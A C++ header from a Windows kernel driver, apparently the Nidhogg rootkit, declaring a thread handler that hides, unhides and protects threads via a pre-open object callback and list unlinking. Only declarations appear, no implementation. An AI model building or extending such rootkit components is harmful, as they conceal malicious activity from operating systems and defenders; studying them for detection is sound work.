#pragma once
#include "pch.h"
#include "ListHelper.hpp"
#include "MemoryHelper.hpp"
#include "ProcessHelper.h"

extern "C" {
	#include "WindowsTypes.h"
}
#include "NidhoggCommon.h"

// Structs
enum class ThreadType {
	Protected,
	Hidden,
	All
};

struct IoctlThreadEntry {
	ULONG Tid;
	bool Remove;
};

struct IoctlThreadList {
	ThreadType Type;
	SIZE_T Count;
	ULONG* Threads;
};

struct ProtectedThreadEntry {
	LIST_ENTRY Entry;
	ULONG Tid;
};

struct HiddenThreadEntry {
	LIST_ENTRY Entry;
	ULONG Tid;
	PLIST_ENTRY OriginalEntry;
};

struct ThreadList {
	SIZE_T Count;
	FastMutex Lock;
	PLIST_ENTRY Items;
};

class ThreadHandler {
private:
	ThreadList protectedThreads;
	ThreadList hiddenThreads;

	_IRQL_requires_max_(APC_LEVEL)
	bool AddHiddenThread(_In_ HiddenThreadEntry thread);

public:
	void* operator new(size_t size) noexcept {
		return AllocateMemory<PVOID>(size, false);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}

	_IRQL_requires_max_(APC_LEVEL)
	ThreadHandler();

	_IRQL_requires_max_(APC_LEVEL)
	~ThreadHandler();
	
	_IRQL_requires_max_(DISPATCH_LEVEL)
	bool FindThread(_In_ ULONG tid, _In_ ThreadType type);

	_IRQL_requires_max_(APC_LEVEL)
	bool ProtectThread(_In_ ULONG tid);

	_IRQL_requires_max_(APC_LEVEL)
	bool RemoveThread(_In_ ULONG tid, _In_ ThreadType type);

	_IRQL_requires_max_(APC_LEVEL)
	bool ListProtectedThreads(_Inout_ IoctlThreadList* threadList);

	_IRQL_requires_max_(APC_LEVEL)
	bool ListHiddenThreads(_Inout_ IoctlThreadList* threadList);

	_IRQL_requires_max_(APC_LEVEL)
	void ClearThreadList(_In_ ThreadType type);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS HideThread(_In_ ULONG tid);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS UnhideThread(_In_ ULONG tid);
};

inline ThreadHandler* NidhoggThreadHandler;

OB_PREOP_CALLBACK_STATUS OnPreOpenThread(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);